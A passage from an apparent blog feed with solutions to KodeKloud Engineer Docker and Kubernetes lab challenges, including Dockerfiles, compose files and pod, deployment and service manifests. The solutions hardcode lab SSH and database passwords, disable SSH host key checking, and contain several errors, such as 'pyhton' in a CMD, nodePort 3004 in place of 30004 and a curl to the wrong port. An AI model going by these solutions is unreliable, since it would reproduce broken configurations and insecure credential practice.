</span></span><span style="display:flex;"><span>    <span style="color:#f92672">ports</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;5004:80&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">volumes</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">/opt/itadmin:/usr/local/apache2/htdocs</span>
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="resolve-dockerfile-issues">Resolve Dockerfile Issues</h2>
<ul>
<li>The Nautilus DevOps team is working to create new images per requirements shared by the development team. One of the team members is working to create a Dockerfile on App Server 3 in Stratos DC. While working on it she ran into issues in which the docker build is failing and displaying errors. Look into the issue and fix it to build an image as per details mentioned below:</li>
<li>a. The Dockerfile is placed on App Server 3 under /opt/docker directory.</li>
<li>b. Fix the issues with this file and make sure it is able to build the image.</li>
<li>c. Do not change base image, any other valid configuration within Dockerfile, or any of the data been used — for example, index.html.</li>
<li>Note: Please note that once you click on FINISH button all existing images, the containers will be destroyed and new image will be built from your Dockerfile.</li>
</ul>
<h6 id="solution-12">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>sshpass -p BigGr33n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no banner@stapp03 
</span></span><span style="display:flex;"><span>cd /opt/docker
</span></span><span style="display:flex;"><span>vi Dockerfile
</span></span></code></pre></div></li>
<li>to solve the problem I have replaced all the lines under <code>FROM</code> with <code>RUN pwd;ls;ls conf.d;ls conf</code> to check which dir does exist conf.d/conf.</li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Docker" data-lang="Docker"><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> httpd:2.4.43</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> sed -i <span style="color:#e6db74">&#34;s/Listen 80/Listen 8080/g&#34;</span> /usr/local/apache2/conf/httpd.conf<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> sed -i <span style="color:#e6db74">&#39;/LoadModule\ ssl_module modules\/mod_ssl.so/s/^#//g&#39;</span> conf/httpd.conf<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> sed -i <span style="color:#e6db74">&#39;/LoadModule\ socache_shmcb_module modules\/mod_socache_shmcb.so/s/^#//g&#39;</span> conf/httpd.conf<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> sed -i <span style="color:#e6db74">&#39;/Include\ conf\/extra\/httpd-ssl.conf/s/^#//g&#39;</span> conf/httpd.conf<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> certs/server.crt /usr/local/apache2/conf/server.crt<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> certs/server.key /usr/local/apache2/conf/server.key<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> html/index.html /usr/local/apache2/htdocs/<span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="resolve-docker-compose-issues">Resolve Docker Compose Issues</h2>
<ul>
<li>The Nautilus DevOps team is working to deploy one of the applications on App Server 1 in Stratos DC. Due to a misconfiguration in the docker compose file, the deployment is failing. We would like you to take a look into it to identify and fix the issues. More details can be found below:</li>
<li>a. docker-compose.yml file is present on App Server 1 under /opt/docker directory.</li>
<li>b. Try to run the same and make sure it works fine.</li>
<li>c. Please do not change the container names being used. Also, do not update or alter any other valid config settings in the compose file or any other relevant data that can cause app failure.</li>
<li>Note: Please note that once you click on FINISH button all existing running/stopped containers will be destroyed, and your compose will be run.</li>
</ul>
<h6 id="solution-13">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>sshpass -p Ir0nM@n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no tony@stapp01
</span></span><span style="display:flex;"><span>cd /opt/docker
</span></span><span style="display:flex;"><span>sudo docker-compose up
</span></span><span style="display:flex;"><span>vi docker-compose.yml
</span></span></code></pre></div></li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">version</span>: <span style="color:#e6db74">&#39;2&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">services</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">web</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">build</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">context</span>: <span style="color:#ae81ff">app/</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">dockerfile</span>: <span style="color:#ae81ff">Dockerfile</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">python</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">ports</span>:
</span></span><span style="display:flex;"><span>            - <span style="color:#e6db74">&#34;5000:5000&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">volumes</span>:
</span></span><span style="display:flex;"><span>            - <span style="color:#ae81ff">.:/code</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">depends_on</span>:
</span></span><span style="display:flex;"><span>            - <span style="color:#ae81ff">redis</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">command</span>: <span style="color:#ae81ff">python app/app.py</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">redis</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">image</span>: <span style="color:#ae81ff">redis</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">redis</span>
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="deploy-an-app-on-docker-containers">Deploy an App on Docker Containers</h2>
<ul>
<li>The Nautilus Application development team recently finished development of one of the apps that they want to deploy on a containerized platform. The Nautilus Application development and DevOps teams met to discuss some of the basic pre-requisites and requirements to complete the deployment. The team wants to test the deployment on one of the app servers before going live and set up a complete containerized stack using a docker compose fie. Below are the details of the task:</li>
<li>On App Server 3 in Stratos Datacenter create a docker compose file /opt/finance/docker-compose.yml (should be named exactly).</li>
<li>The compose should deploy two services (web and DB), and each service should deploy a container as per details below:</li>
<li>For web service:
<ul>
<li>a. Container name must be php_web.</li>
<li>b. Use image php with any apache tag. Check here for more details.</li>
<li>c. Map php_web container&rsquo;s port 80 with host port 6100</li>
<li>d. Map php_web container&rsquo;s /var/www/html volume with host volume /var/www/html.</li>
</ul>
</li>
<li>For DB service:
<ul>
<li>a. Container name must be mysql_web.</li>
<li>b. Use image mariadb with any tag (preferably latest). Check here for more details.</li>
<li>c. Map mysql_web container&rsquo;s port 3306 with host port 3306</li>
<li>d. Map mysql_web container&rsquo;s /var/lib/mysql volume with host volume /var/lib/mysql.</li>
<li>e. Set MYSQL_DATABASE=database_web and use any custom user ( except root ) with some complex password for DB connections.</li>
</ul>
</li>
<li>After running docker-compose up you can access the app with curl command curl <!-- raw HTML omitted -->:6100/
For more details check here.</li>
<li>Note: Once you click on FINISH button, all currently running/stopped containers will be destroyed and stack will be deployed again using your compose file.</li>
</ul>
<h6 id="soluiton">Soluiton</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sshpass -p BigGr33n ssh -o StrcitHostKeyChecking<span style="color:#f92672">=</span>no banner@stapp03
</span></span><span style="display:flex;"><span>cd /opt/finance
</span></span><span style="display:flex;"><span>sudo vi docker-compose.yml
</span></span><span style="display:flex;"><span>sudo docker-compose up -d
</span></span><span style="display:flex;"><span>sudo docker ps
</span></span><span style="display:flex;"><span>curl localhost:6100
</span></span><span style="display:flex;"><span>curl stapp03:6100  
</span></span></code></pre></div></li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">version</span>: <span style="color:#e6db74">&#34;3&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">services</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">web</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">php_web</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">php:7.3-apache-stretch</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">ports</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;6100:80&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">volumes</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">/var/www/html:/var/www/html</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">DB</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">mysql_web</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">mariadb:latest</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">ports</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;3306:3306&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">volumes</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">/var/lib/mysql:/var/lib/mysql</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">environment</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">MYSQL_DATABASE</span>: <span style="color:#ae81ff">database_web</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">MYSQL_ROOT_PASSWORD</span>: <span style="color:#ae81ff">r00t321</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">MYSQL_USER</span>: <span style="color:#ae81ff">kodekloud</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">MYSQL_PASSWORD</span>: <span style="color:#ae81ff">k0d3kl0ud3</span>
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="docker-node-app">Docker Node App</h2>
<ul>
<li>There is a requirement to Dockerize a Node app and to deploy the same on App Server 3. Under /node_app directory on App Server 3, we have already placed a package.json file that describes the app dependencies and server.js file that defines a web app framework.</li>
<li>Create a Dockerfile (name is case sensitive) under /node_app directory:
<ul>
<li>Use any node image as the base image.</li>
<li>Install the dependencies using package.json file.</li>
<li>Use server.js in the CMD.</li>
<li>Expose port 5001.</li>
</ul>
</li>
<li>The build image should be named as nautilus/node-web-app.</li>
<li>Now run a container named nodeapp_nautilus using this image.</li>
<li>Map the container port 5001 with the host port 8093.</li>
<li>Once deployed, you can test the app using a curl command on App Server 3:
<ul>
<li><code>curl http://localhost:8093</code></li>
</ul>
</li>
</ul>
<h6 id="solution-14">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>sshpass -p BigGr33n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no banner@stapp03
</span></span><span style="display:flex;"><span>cd /node_app
</span></span><span style="display:flex;"><span>sudo vim Dockerfile
</span></span><span style="display:flex;"><span>docker build -t nautilus/node-web-app .
</span></span><span style="display:flex;"><span>docker run -d --name nodeapp_nautilus -p 8093:5001 nautilus/node-web-app
</span></span><span style="display:flex;"><span>curl localhost:8096
</span></span></code></pre></div></li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Docker" data-lang="Docker"><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> node:alpine</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span><span style="color:#e6db74"> /app</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;package.json&#34;</span>,<span style="color:#e6db74">&#34;server.js&#34;</span>,<span style="color:#e6db74">&#34;./&#34;</span><span style="color:#f92672">]</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> npm install<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">EXPOSE</span><span style="color:#e6db74"> 5001</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">CMD</span> [<span style="color:#e6db74">&#34;node&#34;</span>, <span style="color:#e6db74">&#34;server.js&#34;</span>]<span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="docker-python-app">Docker Python App</h2>
<ul>
<li>A python app needed to be Dockerized, and then it needs to be deployed on App Server 2. We have already copied a requirements.txt file (having the app dependencies) under /python_app/src/ directory on App Server 2. Further complete this task as per details mentioned below:
<ul>
<li>Create a Dockerfile under /python_app directory:
<ul>
<li>Use any python image as the base image.</li>
<li>Install the dependencies using requirements.txt file.</li>
<li>Expose the port 3002.</li>
<li>Run the server.py script using CMD.</li>
</ul>
</li>
<li>Build an image named nautilus/python-app using this Dockerfile.</li>
<li>Once image is built, create a container named pythonapp_nautilus:
<ul>
<li>Map port 3002 of the container to the host port 8097.</li>
</ul>
</li>
<li>Once deployed, you can test the app using curl command on App Server 2.</li>
</ul>
</li>
</ul>
<h6 id="solution-15">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sshpass -p Am3ric@ ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no steve@stapp02
</span></span><span style="display:flex;"><span>cd /python_app
</span></span><span style="display:flex;"><span>sudo vi Dockerfile
</span></span><span style="display:flex;"><span>docker build -t nautilus/python-app .
</span></span><span style="display:flex;"><span>docker run -d --name pythonapp_nautilus -p 8097:3002 nautilus/python-app
</span></span><span style="display:flex;"><span>docker ps
</span></span><span style="display:flex;"><span>curl localhost:8097
</span></span></code></pre></div></li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Docker" data-lang="Docker"><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> python:3</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> src .<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> pip install --no-cache-dir -r requirements.txt<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">EXPOSE</span><span style="color:#e6db74"> 3002</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">CMD</span> [<span style="color:#e6db74">&#34;pyhton&#34;</span>,<span style="color:#e6db74">&#34;server.py&#34;</span>]<span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div></li>
</ul>
<blockquote>
<p>DONE!!</p>
</blockquote>
]]></content></item><item><title>KodeKloud Engineer Kubernetes Challenges</title><link>https://chxmxii.github.io/portfolio/posts/2023/08/kodekloud-engineer-kubernetes-challenges/</link><pubDate>Fri, 04 Aug 2023 00:00:00 +0000</pubDate><guid>https://chxmxii.github.io/portfolio/posts/2023/08/kodekloud-engineer-kubernetes-challenges/</guid><description>Kuberentes time check pod The Nautilus DevOps team want to create a time check pod in a particular Kubernetes namespace and record the logs. This might be initially used only for testing purposes, but later can be implemented in an existing cluster. Please find more details below about the task and perform it. Create a pod called time-check in the datacenter namespace. This pod should run a container called time-check, container should use the busybox image with latest tag only and remember to mention tag i.</description><content type="html"><![CDATA[<h2 id="kuberentes-time-check-pod">Kuberentes time check pod</h2>
<ul>
<li>The Nautilus DevOps team want to create a time check pod in a particular Kubernetes namespace and record the logs. This might be initially used only for testing purposes, but later can be implemented in an existing cluster. Please find more details below about the task and perform it.</li>
<li>Create a pod called time-check in the datacenter namespace. This pod should run a container called time-check, container should use the busybox image with latest tag only and remember to mention tag i.e busybox:latest.</li>
<li>Create a config map called time-config with the data TIME_FREQ=11 in the same namespace.</li>
<li>The time-check container should run the command: while true; do date; sleep $TIME_FREQ;done and should write the result to the location /opt/data/time/time-check.log. Remember you will also need to add an environmental variable TIME_FREQ in the container, which should pick value from the config map TIME_FREQ key.</li>
<li>Create a volume log-volume and mount the same on /opt/data/time within the container.</li>
<li>Note: The kubectl utility on jump_host has been configured to work with the kubernetes cluster.</li>
</ul>
<h6 id="solution">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>vi ns.yml
</span></span><span style="display:flex;"><span>vi configmap.yml
</span></span><span style="display:flex;"><span>vi pod.yml
</span></span><span style="display:flex;"><span>kubectl get ns
</span></span><span style="display:flex;"><span>kubectl get configmap -n datacenter
</span></span><span style="display:flex;"><span>kubectl get pods -n datacenter
</span></span></code></pre></div></li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#75715e">#ns.yml</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Namespace</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">datacenter</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#configmap.yml</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">ConfigMap</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">time-config</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">namespace</span>: <span style="color:#ae81ff">datacenter</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">data</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">TIME_FREQ</span>: <span style="color:#e6db74">&#34;11&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#pod.yml</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Pod</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">time-check</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">namespace</span>: <span style="color:#ae81ff">datacenter</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">containers</span>:
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">time-check</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">image</span>: <span style="color:#ae81ff">busybox:latest</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">command</span>: [ <span style="color:#e6db74">&#34;sh&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">&#34;while true; do date; sleep $TIME_FREQ;done &gt;&gt; /opt/data/time/time-check.log&#34;</span> ]
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">env</span>:
</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">TIME_FREQ</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">valueFrom</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">configMapKeyRef</span>:
</span></span><span style="display:flex;"><span>              <span style="color:#f92672">name</span>: <span style="color:#ae81ff">time-config</span>
</span></span><span style="display:flex;"><span>              <span style="color:#f92672">key</span>: <span style="color:#ae81ff">TIME_FREQ</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">volumeMounts</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">log-volume</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/opt/data/time</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">volumes</span>:
</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">log-volume</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">emptyDir </span>: {}
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">restartPolicy</span>: <span style="color:#ae81ff">Never</span>
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="deploy-apache-web-server-on-kubernetes-cluster">Deploy Apache Web Server on Kubernetes Cluster</h2>
<ul>
<li>There is an application that needs to be deployed on Kubernetes cluster under Apache web server. The Nautilus application development team has asked the DevOps team to deploy it. We need to develop a template as per requirements mentioned below:</li>
<li>Create a namespace named as httpd-namespace-devops.</li>
<li>Create a deployment named as httpd-deployment-devops under newly created namespace. For the deployment use httpd image with latest tag only and remember to mention the tag i.e httpd:latest, and make sure replica counts are 2.</li>
<li>Create a service named as httpd-service-devops under same namespace to expose the deployment, nodePort should be 30004.</li>
</ul>
<h6 id="solution-1">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>touch <span style="color:#f92672">{</span>ns,dep,srv<span style="color:#f92672">}</span>.yml
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify later</span>
</span></span><span style="display:flex;"><span>kubectl get deployment -n httpd-namespace-devops 
</span></span><span style="display:flex;"><span>kubectl get service -n httpd-namespace-devops
</span></span></code></pre></div></li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#75715e">#ns.yml</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Namespace</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">httpd-namespace-devops</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#srv.yml</span>
</span></span><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Service</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">httpd-service-devops</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">namespace</span>: <span style="color:#ae81ff">httpd-namespace-devops</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">type</span>: <span style="color:#ae81ff">NodePort</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">selector</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">app</span>: <span style="color:#ae81ff">httpd_app_devops</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">ports</span>:
</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">port</span>: <span style="color:#ae81ff">80</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">targetPort</span>: <span style="color:#ae81ff">80</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">nodePort</span>: <span style="color:#ae81ff">3004</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#dep.yml</span>
</span></span><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">apps/v1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Deployment</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">httpd-deployment-devops</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">namespace</span>: <span style="color:#ae81ff">httpd-namespace-devops</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">replicas</span>: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">selector</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">matchLabels</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">app</span>: <span style="color:#ae81ff">httpd_app_devops</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">template</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">labels</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">app</span>: <span style="color:#ae81ff">httpd_app_devops</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">containers</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">httpd-container</span>
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="fix-issue-with-volumemounts-in-kubernetes">Fix Issue with VolumeMounts in Kubernetes:</h2>
<hr>
<h2 id="deploy-nginx-and-phpfpm-on-kubernetes">Deploy Nginx and Phpfpm on Kubernetes</h2>
<ul>
<li>The Nautilus Application Development team is planning to deploy one of the php-based application on Kubernetes cluster. As per discussion with DevOps team they have decided to use nginx and phpfpm. Additionally, they shared some custom configuration requirements. Below you can find more details. Please complete the task as per requirements mentioned below:</li>
<li>Create a service to expose this app, the service type must be NodePort, nodePort should be 30012.</li>
<li>Create a config map nginx-config for nginx.conf as we want to add some custom settings for nginx.conf.
<ul>
<li>Change default port 80 to 8096 in nginx.conf.</li>
<li>Change default document root /usr/share/nginx to /var/www/html in nginx.conf.</li>
<li>Update directory index to index index.html index.htm index.php in nginx.conf.</li>
</ul>
</li>
<li>Create a pod named nginx-phpfpm .
<ul>
<li>Create a shared volume shared-files that will be used by both containers (nginx and phpfpm) also it should be a emptyDir volume.</li>
<li>Map the ConfigMap we declared above as a volume for nginx container. Name the volume as nginx-config-volume, mount path should be /etc/nginx/nginx.conf and subPath should be nginx.conf</li>
<li>Nginx container should be named as nginx-container and it should use nginx:latest image. PhpFPM container should be named as php-fpm-container and it should use php:7.0-fpm image.</li>
